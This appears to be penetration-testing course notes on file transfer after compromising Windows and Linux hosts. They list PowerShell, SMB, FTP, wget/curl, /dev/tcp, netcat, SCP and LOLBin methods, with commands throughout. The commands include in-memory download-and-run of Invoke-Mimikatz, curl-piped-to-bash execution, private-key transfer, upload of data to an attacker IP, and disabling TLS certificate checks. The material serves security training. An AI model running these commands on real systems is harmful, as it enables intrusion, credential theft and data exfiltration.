# File Transfer

## File Transfer

***

***

## Windows File Transfer Methods

## **PowerShell Base64 Encode & Decode**

* use `md5sum filename` to get the md5 hash of file.
* then encode the file using `base64` ; `cat id_rsa |base64 -w 0;echo`
* now copy paste this encoded `base64` data into windows, use powershell to decode this `base64` data .
* then check the `md5` hash of this file to that of 1st step.

## **PowerShell Web Downloads** ⭐

System.Net.WebClient class in powershell can be used to download a file over HTTP, HTTP and FTP.

| Method                                                                                            | Description                                                                                                      |
| ------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------- |
| https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openread?view=net-6.0            | Returns the data from a resource as a https://docs.microsoft.com/en-us/dotnet/api/system.io.stream?view=net-6.0. |
| https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openreadasync?view=net-6.0       | Returns the data from a resource without blocking the calling thread.                                            |
| https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddata?view=net-6.0        | Downloads data from a resource and returns a Byte array.                                                         |
| https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddataasync?view=net-6.0   | Downloads data from a resource and returns a Byte array without blocking the calling thread.                     |
| https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfile?view=net-6.0        | Downloads data from a resource to a local file.                                                                  |
| https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfileasync?view=net-6.0   | Downloads data from a resource to a local file without blocking the calling thread.                              |
| https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstring?view=net-6.0      | Downloads a String from a resource and returns a String.                                                         |
| https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstringasync?view=net-6.0 | Downloads a String from a resource without blocking the calling thread.                                          |

#### **PowerShell DownloadFile Method**

```powershell
PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')PS)
C:\htb> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')

PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')PS 
C:\htb> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\PowerViewAsync.ps1')
```

#### **PowerShell DownloadString - Fileless Method**

As we previously discussed, fileless attacks work by using some operating system functions to download the payload and execute it directly. PowerShell can also be used to perform fileless attacks. Instead of downloading a PowerShell script to disk, we can run it directly in memory using the [Invoke-Expression](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.2) cmdlet or the alias `IEX`.

```jsx
PS C:\htb> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')

or

PS C:\htb> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX

```

#### **PowerShell Invoke-WebRequest**

```jsx
PS C:\htb> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1

```

## Common Errors with PowerShell ⭐

*   There may be cases when the Internet Explorer first-launch configuration has not been completed, which prevents the download.

    This can be bypassed using the parameter `-UseBasicParsing`.

```jsx
PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX

Invoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again.
At line:1 char:1
+ Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/P ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ CategoryInfo : NotImplemented: (:) [Invoke-WebRequest], NotSupportedException
+ FullyQualifiedErrorId : WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand

PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```

* Another error in PowerShell downloads is related to the SSL/TLS secure channel if the certificate is not trusted. We can bypass that error with the following command:

```powershell
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')

Exception calling "DownloadString" with "1" argument(s): "The underlying connection was closed: Could not establish trust
relationship for the SSL/TLS secure channel."
At line:1 char:1
+ IEX(New-Object Net.WebClient).DownloadString('https://raw.githubuserc ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : WebException
PS C:\htb> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

## **SMB Downloads⭐**

We can use SMB to download files from our Pwnbox easily. We need to create an SMB server in our Pwnbox with [smbserver.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py) from Impacket and then use `copy`, `move`, PowerShell `Copy-Item`, or any other tool that allows connection to SMB.

* create smb server `sudo impacket-smbserver share -smb2support /tmp/smbshare`
* `copy \\192.168.220.133\share\nc.exe` to copy file from pwnbox to Windows

new version of windows block un authenticated guest access, we can fix this by

* create smb server `sudo impacket-smbserver share -smb2support /tmp/smbshare -user test - password test`
* to copy file from pwnbox to Windows `net use n: \\192.168.220.133\share /user:test test`
  * and then `copy n:\nc.exe`

## FTP Downloads⭐

* configure ftp server in a our attacker machine using python3 `pyftpdlib` module. `sudo python3 -m pyftpdlib --port 21`
* once configured, we can perform file transfer using Powershell Net.WebClient
  * `PS C:\htb> (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')`

When we get a shell on a remote machine, we may not have an interactive shell. If that's the case, we can create an FTP command file to download a file. First, we need to create a file containing the commands we want to execute and then use the FTP client to use that file to download that file.

```jsx
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo GET file.txt >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128
Log in with USER and PASS first.
ftp> USER anonymous

ftp> GET file.txt
ftp> bye

C:\htb>more file.txt
This is a test file
```

## **Linux File Transfer Methods**

## **Base64 Encoding / Decoding**

* `md5sum filename` to get the md5 hash of the file
* then base64 encode the content `cat id_rsa |base64 -w 0;echo`
* in victim linux machine, decode base64 encoded string `echo -n 'asdfjsdfjasdasfdasdfdsf...........asdfasdf=' | base64 -d > id_rsa`
* then get the md5 hash of the file to check the md5 hash with the 1st step

## **Web Downloads with Wget and cURL ⭐**

* `wget website.com/file.exe -o file.exe`
* `curl website.com/file.exe -o file.exe`

## **Fileless Attacks Using Linux ⭐**

we don't have to download file to execute it.

* `curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash`
*   `wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3`

    here -q is for quite mode

    and -O- tells wget to output the downloaded content to to standard output (stdout) instead of saving it to a file. single dash - is shorthand for stdout

## **Download with Bash (/dev/tcp) ⭐**

* `exec 3<>/dev/tcp/10.10.10.32/80` connect to target server
* `echo -e "GET /LinEnum.sh HTTP/1.1\n\n">**&3` http get request\*\*
* `cat <&3` print the response

## **SSH Downloads (SCP)⭐**

* `sudo systemctl enable ssh` to enable ssh server
* `sudo systemctl start ssh` to start ssh server
* `scp plaintext@192.168.49.128:/root/myroot.txt .` download file using scp

## **Transferring Files with Code**

* using python2 `python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'`
*   using python3

    `python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'`
*   using php `php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'`

    or

    `php -r 'const BUFFER = 1024; $fremote = fopen("[https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh)", "rb"); $flocal = fopen("[LinEnum.sh](http://linenum.sh/)", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'`

## **Miscellaneous File Transfer Methods**

Using Netcat

* `nc -l -p 8000 > file.exe` on compromised machine
*   `nc -q 0 ip 8000 < file.exe` on attacking machine

    here -q 0 will tell netcat to close the connection once it finishes.

## **Living off The Land**

LOLBins (Living off the Land binaries) → binaries that an attacker can use to perform actions beyond their original purposes

* [GTFOBins for Linux Binaries](https://gtfobins.github.io/)
* [LOLBAS Project for Windows Binaries](https://lolbas-project.github.io/)

We will use LOLBAS and GTFOBins to download , upload files

* for LOLBAS `/upload` or `/download` on search section to get the list of binaries which have these functions.
* for GTFOBINS `+File Upload` or `+File Download` to search

| Command                                                                                                           | Description                                 |
| ----------------------------------------------------------------------------------------------------------------- | ------------------------------------------- |
| Invoke-WebRequest https:///PowerView.ps1 -OutFile PowerView.ps1                                                   | Download a file with PowerShell             |
| IEX (New-Object Net.WebClient).DownloadString('https:///Invoke-Mimikatz.ps1')                                     | Execute a file in memory using PowerShell   |
| Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64                                             | Upload a file with PowerShell               |
| bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe                                                    | Download a file using Bitsadmin             |
| certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe                                                       | Download a file using Certutil              |
| wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh                    | Download a file using Wget                  |
| curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh                    | Download a file using cURL                  |
| php -r '$file = file\_get\_contents("https:///LinEnum.sh"); file\_put\_contents("LinEnum.sh",$file);'             | Download a file using PHP                   |
| scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip                                                  | Upload a file using SCP                     |
| scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe                                                            | Download a file using SCP                   |
| Invoke-WebRequest http://nc.exe -UserAgent \[Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "nc.exe" | Invoke-WebRequest using a Chrome User Agent |
